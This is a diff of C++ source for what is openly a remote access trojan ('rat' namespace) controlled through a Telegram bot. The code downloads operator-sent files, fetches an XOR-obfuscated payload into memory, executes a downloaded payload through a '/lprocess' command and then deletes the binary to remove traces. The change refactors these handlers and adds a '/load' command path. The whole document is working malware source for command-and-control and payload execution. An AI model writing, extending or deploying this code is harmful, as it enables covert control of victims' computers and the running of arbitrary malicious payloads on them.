@@ -13,119 +13,131 @@
 
 namespace rat::handler {
 
-inline std::vector<std::filesystem ::path> Handler::downloadMultipleFiles(
-    ::rat::tbot::BaseBot *Tbot_Bot,
-    const std::vector<::rat::tbot::File> &Tbot_Files) {
-	std::ostringstream response_buffer;
-	std::filesystem::path file_path;
-	std::vector<std::filesystem::path> downloaded_files;
-	downloaded_files.reserve(Tbot_Files.size());
 
-		for(const auto &file : Tbot_Files) {
-			file_path = std::filesystem::current_path();
-				if(file.name.has_value() && !file.name->empty()) {
-					file_path /= file.name.value();
-				}
-				else {
-					file_path /= rat::system::getCurrentDateTime_Underscored();
-				}
-			HANDLER_DEBUG_LOG("We have file {} trying to download it",
-			                  file_path.string());
-				if(Tbot_Bot->downloadFile(file.id, file_path)) {
-					response_buffer << "File: " << file_path.string()
-					                << " has been downloaded\n";
-					downloaded_files.push_back(std::move(file_path));
-				}
-				else {
-					response_buffer << "File: " << file_path.string()
-					                << " has not been downloaded\n";
-				}
-		}
-	Tbot_Bot->sendMessage(response_buffer.str());
-	downloaded_files.shrink_to_fit();
-	return downloaded_files;
+inline std::vector<std::filesystem::path> Handler::downloadMultipleFiles(
+    ::rat::tbot::BaseBot* Tbot_Bot,
+    const std::vector<::rat::tbot::File>& Tbot_Files)
+{
+    std::ostringstream response_buffer;
+    std::vector<std::filesystem::path> downloaded_files;
+    downloaded_files.reserve(Tbot_Files.size());
+
+    for (const auto& file : Tbot_Files) {
+        std::filesystem::path file_path = std::filesystem::current_path();
+
+        if (file.name.has_value() && !file.name->empty()) {
+            file_path /= file.name.value();
+        } else {
+            file_path /= rat::system::getCurrentDateTime_Underscored();
+        }
+
+        // Ensure unique path to avoid collisions
+        size_t suffix = 0;
+        std::filesystem::path unique_path = file_path;
+        while (std::filesystem::exists(unique_path)) {
+            unique_path = file_path;
+            unique_path += "_" + std::to_string(++suffix);
+        }
+        file_path = unique_path;
+
+        HANDLER_DEBUG_LOG("We have file {} trying to download it", file_path.string());
+
+        if (Tbot_Bot->downloadFile(file.id, file_path)) {
+            response_buffer << "File: " << file_path.string() << " has been downloaded\n";
+            downloaded_files.push_back(file_path);
+        } else {
+            response_buffer << "File: " << file_path.string() << " has not been downloaded\n";
+        }
+    }
+
+    Tbot_Bot->sendMessage(response_buffer.str());
+    downloaded_files.shrink_to_fit();
+    return downloaded_files;
 }
 
-void Handler::handleXoredPayload(::rat::tbot::Message &Tbot_Message) {
-		if(Tbot_Message.caption == std::nullopt ||
-		   !Tbot_Message.caption.value().starts_with("/payload") ||
-		   Tbot_Message.caption.value().size() <= 8 ||
-		   Tbot_Message.files.size() != 1) {
-			return;
-		}
+void Handler::handleXoredPayload(::rat::tbot::Message& Tbot_Message) {
+    if (!Tbot_Message.caption || Tbot_Message.files.size() != 1) {
+        return;
+    }
 
-	const std::string &caption = *Tbot_Message.caption;
+    const std::string& caption = *Tbot_Message.caption;
 
-	// Slice after "/payload"
-	std::string_view key = std::string_view(caption).substr(8);
-	// Trim manually (string_view-safe)
-	auto trim_view = [](std::string_view sv) {
-		size_t start = sv.find_first_not_of(" \t\n\r");
-		size_t end = sv.find_last_not_of(" \t\n\r");
-		if(start == std::string_view::npos)
-			return std::string_view{};
-		return sv.substr(start, end - start + 1);
-	};
+    std::string_view key;
+    if (caption.size() > 6) { // minimal safe length for "/load "
+        key = std::string_view(caption).substr(6); // grab after "/load "
+    }
 
-	key = trim_view(key);
+    auto trim_view = [](std::string_view sv) {
+        size_t start = sv.find_first_not_of(" \t\n\r");
+        size_t end = sv.find_last_not_of(" \t\n\r");
+        if (start == std::string_view::npos)
+            return std::string_view{};
+        return sv.substr(start, end - start + 1);
+    };
 
-	// Copy into state (required since caption may not outlive state)
-	this->state.payload_key.assign(key);
-	// this is special code that is really unique to this operation;
-	::rat::networking::XorDataContext xored_data_context = {
-	    &this->state.payload_key, 0, &this->state.payload};
+    key = trim_view(key);
+    std::string key_str = key.empty() ? ::rat::system::getCurrentDateTime_Underscored() : std::string(key);
+    this->state.payload_key = key_str;
 
-	std::vector<uint8_t> backup_payload = this->state.payload;
+    ::rat::networking::XorDataContext xored_data_context = {
+        &this->state.payload_key, 0, &this->state.payload
+    };
 
-	const std::string &file_id = Tbot_Message.files[0].id;
-	const std::string file_url =
-	    fmt::format("{}{}", this->bot->getBotFileUrl(), file_id);
+    std::vector<uint8_t> backup_payload = this->state.payload;
+    const std::string& file_id = Tbot_Message.files[0].id;
+    const std::string file_url = fmt::format("{}{}", this->bot->getBotFileUrl(), file_id);
 
-	auto result =
-	    this->bot->curl_client.downloadDataXored(file_url, xored_data_context);
-		if(result.curl_code != CURLE_OK) {
-			this->state.payload = std::move(backup_payload);
-			HANDLER_ERROR_LOG("Failed to downlaod the obfuscated payload");
-			return;
-		}
+    auto result = this->bot->curl_client.downloadDataXored(file_url, xored_data_context);
+    if (result.curl_code != CURLE_OK) {
+        this->state.payload = std::move(backup_payload);
+        HANDLER_ERROR_LOG("Failed to download the obfuscated payload");
+        return;
+    }
 
-	HANDLER_DEBUG_LOG("Succeeded at downloading the payload");
+    HANDLER_DEBUG_LOG("Succeeded at downloading the payload into RAM obfuscated");
 }
 
-inline void Handler::handlePayload(::rat::tbot::Message &Tbot_Message,
-                                   const std::filesystem::path &Payload_Path) {
-		if(Tbot_Message.caption.value() != "/payload") {
-			this->handleXoredPayload(Tbot_Message);
-			return;
-		}
-	const std::string &dummy_telegram_message =
-	    fmt::format("/lprocess {}", Payload_Path.string());
-	HANDLER_DEBUG_LOG("Dummy telegram message created and assinged");
-	Tbot_Message.text = std::move(dummy_telegram_message);
+inline void Handler::handlePayload(::rat::tbot::Message& Tbot_Message,
+                                   const std::filesystem::path& Payload_Path)
+{
+    const std::string dummy_telegram_message = fmt::format("/lprocess {}", Payload_Path.string());
+    HANDLER_DEBUG_LOG("Dummy telegram message created and assigned");
 
-	this->parseTelegramMessageToCommand();
+    Tbot_Message.text = dummy_telegram_message;
 
-	this->handleProcessCommand();
+    this->parseTelegramMessageToCommand();
+    this->handleProcessCommand();
 
-	HANDLER_DEBUG_LOG("The payload launched, removing binary");
+    HANDLER_DEBUG_LOG("The payload launched, removing binary");
 
-	std::filesystem::remove(Payload_Path);
+    // Remove file safely after use
+    std::error_code ec;
+    std::filesystem::remove(Payload_Path, ec);
+    if (ec) {
+        HANDLER_ERROR_LOG("Failed to remove payload file {}: {}", Payload_Path.string(), ec.message());
+    }
 }
 
 void Handler::handleMessageWithUploadedFiles() {
-		if(this->telegram_update->message.files.empty()) {
-			return;
-		}
-	HANDLER_DEBUG_LOG("Uploaded file caption {}\nNumber of uploaded files{}",
-	                  this->telegram_update->message.caption.value_or("None"),
-	                  this->telegram_update->message.files.size());
-	const auto file_paths = this->downloadMultipleFiles(
-	    this->bot.get(), this->telegram_update->message.files);
-		if(!file_paths.empty()) {
-			this->handlePayload(this->telegram_update->message, file_paths[0]);
-		}
-}
+    if (this->telegram_update->message.files.empty()) {
+        return;
+    }
 
+    const auto& caption_opt = this->telegram_update->message.caption;
+    HANDLER_DEBUG_LOG("Uploaded file caption: {}\nNumber of uploaded files: {}",
+                      caption_opt.value_or("None"),
+                      this->telegram_update->message.files.size());
+
+    if (caption_opt && caption_opt->starts_with("/load")) {
+        this->handleXoredPayload(this->telegram_update->message);
+        return;
+    }
+
+    const auto file_paths = this->downloadMultipleFiles(this->bot.get(), this->telegram_update->message.files);
+    if (!file_paths.empty()) {
+        this->handlePayload(this->telegram_update->message, file_paths[0]);
+    }
+}
 } // namespace rat::handler
 
 #undef HANDLER_DEBUG_LOG
